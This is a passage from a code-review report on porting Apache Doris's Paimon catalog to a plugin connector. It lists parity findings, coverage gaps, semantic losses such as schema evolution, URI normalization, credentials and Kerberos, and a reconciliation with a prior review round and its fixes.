faithful port. READ direction is mostly faithful but drops three column-level legacy semantics
(`uniqueId`/field-id, all-columns `isKey=true`, `WITH_TIMEZONE` extraInfo). The field-id loss
is the serious one (MAJOR M-10, root cause of the BE schema-evolution BLOCKER). WRITE also
silently drops nested struct-field comments. The standalone `getUniqueId()` repro was refuted
(§4); the real impact rides on B2.

**Path #11 — MTMV (materialized view): NOT at parity (MAJOR).** MTMV path is LIVE on the
connector; legacy `PaimonExternalTable` is dead baseline. Partition listing/name rendering,
`PartitionItem` build, `isPartitionInvalid`, MTMV snapshots, and the three consumers all map
1:1 to legacy. The one substantive divergence: legacy wrapped partition listing in the
Kerberos authenticator (UGI `doAs`); the connector read path does NOT (MAJOR M-11, scoped to
secured HMS deployments; the "DLF" clause is overstated).

**Path #12 — MVCC (MvccSnapshot): CLEAN.** Faithfully migrated and LIVE. The three MVCC SPI
methods reproduce legacy `getPaimonSnapshotCacheValue` and PaimonUtil resolution exactly
(query-begin pins latest, explicit time-travel pins `scan.snapshot-id`/`scan.tag-name`, @incr
ports validation byte-for-byte, @branch loads the branch table via a 3-arg Identifier). The
scan-side pin is correct at all three handle-consumption sites; the pinned table is serialized
to BE identically to legacy. No fallback, no shadow class, no swallowing no-op, no
serialization mismatch. Two narrow, documented, benign MINOR/NIT divergences.

**Path #13 — Cross-cutting fallback enumeration: see §8.** Cutover is active; legacy
`datasource/paimon/*` is dead-but-in-tree and NONE are reached on the connector path. Every
fe-core consumer that still imports/instanceof's legacy paimon is ordered or gated so the
PluginDriven branch wins and preserves legacy semantics. The serious divergences are NOT
fallbacks into old logic but LOST legacy semantics on the BE serialization contract (schema
evolution + `force_jni_scanner`/`ignore_split_type`). One BLOCKER + one MAJOR + one MINOR.

---

## 7. Completeness Critic

### Coverage gaps surfaced (warrant a follow-up pass)

1. **DDL operations (CREATE/DROP TABLE, CREATE/DROP DATABASE) and ALTER TABLE
   CREATE/DROP BRANCH/TAG.** None of the 13 paths traced `PaimonConnectorMetadata`
   `createTable`/`dropTable`/`createDatabase`/`dropDatabase`
   (`PaimonConnectorMetadata.java:683-797`) against legacy `PaimonMetadataOps` end-to-end.
   Branch/tag READ was covered (path #4) but branch/tag DDL WRITE
   (`ExternalCatalog.java:1427-1513`) was not. **Follow-up:** trace IF-NOT-EXISTS/IF-EXISTS
   short-circuit, editlog/cache-refresh ordering, and error-code parity
   (`ERR_DB_CREATE_EXISTS` vs `DorisConnectorException`) on stale FE cache.
2. **Read-direction type-mapping catalog flags** (`enable.mapping.varbinary` /
   `enable.mapping.timestamp_tz`). Path #10 examined the mapping LOGIC but never checked the
   PROPERTY-KEY wiring — which is broken (see additional_finding #1 / MAJOR M-crit).
   **Follow-up:** add a UT asserting an LTZ column maps to TIMESTAMPTZ with
   `{"enable.mapping.timestamp_tz":"true"}`; verify the connector reads the dotted keys (or
   that the FE layer normalizes dots→underscores).
3. **Statistics / fetchRowCount / ANALYZE.** `fetchRowCount` independently confirmed a faithful
   port (no finding), but `ExternalAnalysisTask` / column-statistics path not compared.
   **Follow-up:** confirm `ANALYZE TABLE` and `getColumnStatistic` parity.
4. **HMS flavor hive-site.xml / hadoop conf resource loading.** Path #8 covered HMS Kerberos
   auth survival but not `hive.config.resources` / hive-site.xml downflow into BE-facing scan
   properties. **Follow-up:** trace whether `hive.config.resources` reaches
   `getScanNodeProperties` for HMS/DLF as it did in legacy `getLocationProperties`.
5. **Native sub-file split parallelism + deletion-file pairing under splitting.** Path #1
   flagged the parallelism loss but did not analyze plan-shape impact on batch-mode scheduling
   / `SqlBlockRuleMgr` split-count limits (a known prior regression area).
   **Follow-up:** check split-count accounting is fed the per-RawFile count and that batch-mode
   large-file scans still parallelize acceptably.

### Additional findings surfaced by the critic

- **MAJOR (M-crit, listed in §3):** Read-schema type-mapping flags silently disabled
  (dotted-vs-underscore key mismatch) → wrong Doris column types for users who enabled
  BINARY→VARBINARY or TIMESTAMP_TZ→TIMESTAMPTZ. **The most important thing the 13 paths
  missed.**
- **BLOCKER (re-confirmation):** Native DV/data-file paths sent un-normalized, confirmed
  end-to-end through the BE file factory (`paimon_reader.cpp` opens `delete_range.path`
  verbatim; unrecognized scheme fails the MOR read). Corroborates B-7DV / B-7DF.
- **BLOCKER (re-confirmation):** Native schema-evolution loss confirmed through BE
  (`table_schema_change_helper.h:219-236` falls back to `by_parquet_name`/`by_orc_name` when
  `history_schema_info` is unset). Corroborates B-1a / B2.
- **MINOR:** Partition NULL render-string divergence (`\N` vs `""`) + literal-sentinel
  coercion.
- **MINOR:** Branch/tag DDL rejected with a different exception type/message (both reject;
  not a functional regression).

### Critic overall assessment

The 13-path digest is broadly accurate; the two BLOCKER families (native scheme-normalization
loss and native schema-evolution loss) are real and independently confirmed end-to-end
including the BE-side mechanism. The cutover dispatch is sound: every fe-core switch checked
(`BindRelation:543`, `Alter:620`, `ShowPartitionsCommand:263`, `Env` SHOW CREATE TABLE`:4929`,
`TableIf.toMysqlType:323`) has a `PLUGIN_EXTERNAL_TABLE` branch preserving legacy semantics;
the `instanceof PaimonExternalTable` sites (`Env:4910`, `PaimonSysTable:62`, `PaimonSource:73`)
are dead for cutover catalogs. The connector `PaimonPredicateConverter` and `fetchRowCount` are
faithful ports. The reviewers' biggest miss is the dotted-vs-underscore mapping-flag MAJOR.

---

## 8. Cross-Cutting Fallback Enumeration (Path #13)

**Are there places still running old logic / falling back / losing semantics?**

**No live fallback into legacy code was found.** Cutover is active and the legacy
`datasource/paimon/*` set is dead-but-in-tree:

- `CatalogFactory` routes `paimon` through the SPI (`SPI_READY_TYPES`,
  `CatalogFactory.java:51,104-112`), so the catalog/db/table become `PluginDriven*`.
- The following legacy classes are **NONE reached** on the connector path:
  `PaimonExternalCatalog` / `PaimonExternalDatabase` / `PaimonExternalTable`,
  `PaimonExternalMetaCache`, `metacache/paimon/*` loaders, `source/PaimonScanNode`,
  `source/PaimonPredicateConverter`, `systable/PaimonSysTable`,
  `Paimon*MetaStoreProperties`, `PaimonVendedCredentialsProvider`,
  `VendedCredentialsFactory.PAIMON`.
- Every fe-core consumer that still imports/instanceof's legacy paimon
  (`ShowPartitionsCommand`, `Env` SHOW CREATE TABLE, `UserAuthentication`,
  `ExternalMetaCacheRouteResolver`, `BindRelation`, `Alter`, `TableIf`,
  `ExternalCatalog.getDb`, `SysTableResolver`) is either **ordered** so the `PluginDriven`
  branch wins first, or **gated** on a `logType`/`getType()`/`instanceof` that the connector
  objects never satisfy, with the connector branch preserving legacy semantics.
- No shadow/duplicate classes, no stubs/TODOs swallowing behavior, no no-op SPI hooks
  swallowing a result. `PaimonExternalCatalogFactory` has zero callers; GSON compat at
  `persist/gson/GsonUtils.java:403-411,463-464,488-489` revives every old paimon
  catalog/db/table as the `PluginDriven*` variant.

**Places that LOSE legacy semantics (not fallbacks — the connector re-implements without
the step, silently degrading the frozen BE contract):**

1. **Native field-id schema-evolution** — the connector never emits
   `history_schema_info` / `current_schema_id`, so the BE scanner degrades from FIELD-ID to
   NAME-based file<->table column matching → wrong/NULL rows on column rename/reorder.
   (BLOCKER B-1a / B2.) Legacy baseline: `paimon/source/PaimonScanNode.java` +
   `ExternalUtil.initSchemaInfo` + `PaimonUtil.getHistorySchemaInfo`.
2. **Native URI scheme normalization** — data-file and deletion-file paths sent un-normalized
   (oss/cos/obs/s3a not rewritten to s3), breaking native + DV reads on S3-compatible
   warehouses. (BLOCKERs B-7DF / B-7DV.) Legacy baseline: 2-arg
   `LocationPath.of(path, storagePropertiesMap)`.
3. **Static object-store credentials** delivered as RAW keys instead of canonical `AWS_*`.
   (BLOCKER B-9.) Legacy baseline:
   `CredentialUtils.getBackendPropertiesFromStorageMap(getBackendConfigProperties())`.
4. **JNI-vs-native reader session knobs** — `force_jni_scanner` (MAJOR M-1) and
   `ignore_split_type` (MINOR) are dropped from the connector's reader-selection logic.
5. **Kerberos UGI `doAs`** — lost on filesystem/jdbc catalog ops (MAJOR M-8) and on MTMV /
   SHOW PARTITIONS / partitions-TVF partition listing (MAJOR M-11) on secured HMS deployments.
6. **Type-mapping flags** — read via the wrong (underscore) property keys, so
   `enable.mapping.*` is silently inert (MAJOR M-crit).

These are semantic losses on the BE serialization / auth contract, NOT routes back into old
logic. The legacy baseline for all of (1)/(2)/(4) is
`fe/fe-core/.../paimon/source/PaimonScanNode.java` + `ExternalUtil.initSchemaInfo` +
`PaimonUtil.getHistorySchemaInfo`.

---

## 9. Phase C — Cross-Check vs the Prior Round (post-independent reconciliation)

> Discipline: this round's findings (§2–§8) were produced independently in a clean room
> BEFORE reading the prior round. This section reconciles them against the prior review
> (`P5-paimon-fullpath-review-2026-06-11.md`, 6 BLOCKER / 8 MAJOR / 11 CONFIRMED) and the **8
> committed fixes** that landed between the rounds (HEAD `98a73bf7692`). It only classifies;
> it does **not** soften any independent finding.

The 8 fixes (design docs in `plan-doc/tasks/designs/P5-fix-*`): **FIX-NATIVE-PARTVAL,
FIX-TZ-ALIAS, FIX-REST-VENDED, FIX-STORAGE-CREDS, FIX-HMS-CONFRES, FIX-READ-NOTNULL,
FIX-TABLE-STATS, FIX-CPP-READER**. They collectively targeted all 11 prior CONFIRMED findings.
The two prior **PARTIAL** findings (DV-normalization P7, JDBC driver_url P8.3) were **not** in
the fix set, and the decision/deviation logs record **no** formal deferral of them.

### 9.1 Fix effectiveness — prior CONFIRMED findings this round re-tested

| Prior finding (severity) | Fix | This round's result | Status |
|---|---|---|---|
| P1 native DATE/LTZ partition-value raw `toString` (BLOCKER) | FIX-NATIVE-PARTVAL | partition rendering now only a `\N`-vs-`""` MINOR | ✅ fixed |
| P3 `FOR TIME AS OF` fails under CST/PST/EST (MAJOR) | FIX-TZ-ALIAS | Path #3 Time Travel = CLEAN (session-TZ parse byte-faithful) | ✅ fixed |
| P8 REST vended credentials not sent to BE (BLOCKER) | FIX-REST-VENDED | Path #9 vended-cred sub-path = CLEAN (normalized AWS_* overlay) | ✅ fixed |
| P9 s3/oss creds lost from Paimon FileIO (BLOCKER) | FIX-STORAGE-CREDS | catalog-side `applyStorageConfig` now translates canonical→`fs.s3a.*` | ✅ fixed **(catalog seam only — see 9.3)** |
| P9 DLF gate-passes-no-OSS-creds (BLOCKER) | FIX-STORAGE-CREDS | not separately re-surfaced | ✅ likely fixed (catalog seam) |
| P10 read path propagates paimon NOT NULL (MAJOR) | FIX-READ-NOTNULL | not re-found (this round's P10 found uniqueId/isKey/WITH_TIMEZONE only) | ✅ likely fixed |
| supplemental getTableStatistics → row-count -1 (MAJOR) | FIX-TABLE-STATS | critic confirmed `fetchRowCount` a faithful port | ✅ fixed |
| supplemental enable_paimon_cpp_reader serialization (BLOCKER) | FIX-CPP-READER | not re-found | ✅ likely fixed |
| supplemental BINARY/VARBINARY partition render + fix-scope (MAJOR) | FIX-NATIVE-PARTVAL | folded into the now-MINOR partition rendering | ✅ fixed |
| P8 HMS `hive.conf.resources` dropped (MAJOR) | FIX-HMS-CONFRES | **NOT re-verified — critic flagged `hive.config.resources` downflow as a coverage gap** | ⚠️ unverified this round |

**Net: of the 11 prior CONFIRMED findings, 8 fixes hold for everything this round actually
re-exercised; only HMS-confres was not re-checked.**

### 9.2 Prior PARTIAL findings — never fixed, this round elevates to BLOCKER

- **DV + data-file URI normalization** (prior P7, PARTIAL 0/0/3) → this round **B-7DV + B-7DF,
  CONFIRMED BLOCKER ×2 (3/3 each)**. The *facts agree across rounds*: both observe the
  deletion-file AND the native data-file path are sent un-normalized. The prior round used
  "the main file fails first, so the DV-silent-data-loss framing is exaggerated" to rate it
  PARTIAL; this round rates it BLOCKER because the read **fails outright** on any
  OSS/COS/OBS/s3a warehouse regardless of which file trips first. Severity reframing, not a
  factual dispute — and it was never fixed.
- **JDBC `driver_url` security validation** (prior P8.3, PARTIAL 1/0/2 "only under hardened
  config") → this round **B-8b, CONFIRMED BLOCKER (3/3)**. Genuine severity divergence: the
  prior round discounted it because the default `jdbc_driver_secure_path="*"` means legacy
  also loads any jar by default. This round rates it BLOCKER on the arbitrary-jar-in-FE-JVM +
  stale "not in SPI_READY_TYPES" disclaimer. **Recommend the user adjudicate severity** —
  but note it is paired with a brand-new hard failure (B-8a) on the same flavor.

### 9.3 The credential story has THREE seams — the prior round + fixes closed two; one remains

This is the most important reconciliation. Credential downflow has three distinct seams:

1. **Catalog FileIO `Configuration`/`HiveConf`** (FE metadata + legacy catalog) — prior P9.1/9.2
   found it, **FIX-STORAGE-CREDS fixed it** (canonical `s3.*`/`oss.*` → `fs.s3a.*`/`fs.oss.*`).
2. **Vended (REST) scan-node → BE** — prior P8.1 found it, **FIX-REST-VENDED fixed it**
   (vended token normalized to `AWS_*` via `ConnectorContext.vendStorageCredentials`).
3. **Static `s3.*`/`oss.*` scan-node → BE** (`PaimonScanPlanProvider.getScanNodeProperties:347-356`)
   — ships raw `location.s3.access_key`; `PluginDrivenScanNode.getLocationProperties:307-320`
   only strips the prefix, never normalizes to `AWS_*`; BE native reader wants `AWS_*`.
   **This seam (B-9) was missed by BOTH the prior round and the fixes — genuinely new.**

So FIX-STORAGE-CREDS was correct but scoped to the catalog seam; the static-credential
BE-scan seam is a third, independent gap this round newly identified.

### 9.4 Genuinely NEW this round (prior round missed or under-rated)

- **B2 — native schema-evolution (`history_schema_info`/`current_schema_id`) lost → BLOCKER.**
  Highest-value divergence. The prior round saw the *adjacent* symptom (P10.2 `uniqueId`=-1)
  and rated it **MINOR** with "unreachable from column-mapping code" — it conflated the
  `Column.getUniqueId()` channel (truly unconsumed) with the **scan-side `history_schema_info`
  channel** (consumed by BE). This round traced the scan→BE path and found BE
  `table_schema_change_helper.h` falls back to NAME matching when the params are unset →
  renamed/reordered columns read NULL/garbage. FIX-NATIVE-PARTVAL fixed partition *values*,
  not schema *evolution* — so this BLOCKER survived both the prior round and the fixes.
  *(Note: this round's own repro lens REFUTED the standalone `uniqueId` symptom — agreeing
  with the prior round — but the BE `history_schema_info` mechanism is a separate, real path.)*
- **B-8a — JDBC raw unresolved `driver_url` → `MalformedURLException` (BLOCKER).** Prior round
  caught only the security facet (P8.3); this round adds the hard functional failure.
- **M-1 — `force_jni_scanner` session var ignored (MAJOR).** Prior round missed.
- **M-8 — filesystem/jdbc Kerberos `doAs` lost (MAJOR).** Prior had only the related
  `hdfs.*`-alias MINOR (P9.3); this round elevates the runtime-authenticator loss.
- **M-11 — MTMV / SHOW PARTITIONS / partitions-TVF Kerberos `doAs` lost (MAJOR).** Prior missed.
- **M-crit — dotted-vs-underscore type-mapping flag keys (MAJOR, critic-surfaced, single-pass).**
  Prior round's P10 verified the mapping *logic* as parity but never checked the property-KEY
  wiring. Not 3-lens-gated this round — lower confidence than the 3/3 findings.

### 9.5 Severity divergences to adjudicate (facts agree, calibration differs)

| Item | Prior | This round | Note |
|---|---|---|---|
| COUNT(\*) pushdown | MINOR (1.2) | MAJOR (M-2) | both: correct results, perf-only. Prior's MINOR is the more conventional call; this round elevates on PK-table cost. |
| Native sub-file splitting | MINOR (1.3) | MAJOR (M-3) | both: correct results, parallelism-only. Same calibration gap. |
| field-id `uniqueId` | MINOR (10.2) | MAJOR (M-10) | both agree standalone repro unreachable; this round escalates because impact rides on B2. |

### 9.6 This round's coverage gaps relative to the prior round

- HMS `hive.conf.resources` (FIX-HMS-CONFRES) **not re-verified** — this round flagged it as a
  coverage gap rather than confirming the fix.
- DLF OSS creds (prior P9.2) not separately re-traced this round.
- A few prior MINORs (HMS socket-timeout P8.4, `hive.metastore.username` alias P8.5) were not
  re-listed; prior P9.3 `hdfs.*` defaults partially re-surfaced as this round's path-9 MINOR.

### 9.7 Reconciled bottom line

The two rounds **converge** on the clean paths (@incr, time-travel, branch/tag, sys-tables,
metadata-cache, MVCC) and **agree** that the 8 committed fixes resolved the prior round's
confirmed findings this round re-tested. The cutover-dispatch soundness (no live fallback into
legacy) is independently re-confirmed. **NOT commit-ready stands and is strengthened**, gated
by: (a) two prior PARTIALs never fixed, now confirmed BLOCKERs (DV/data-file normalization;
JDBC); (b) a third, newly-found credential seam (static→BE scan, B-9); and (c) a genuinely-new
BLOCKER the prior round under-rated as MINOR (native schema-evolution, B2). No prior CONFIRMED
finding was contradicted by this round.
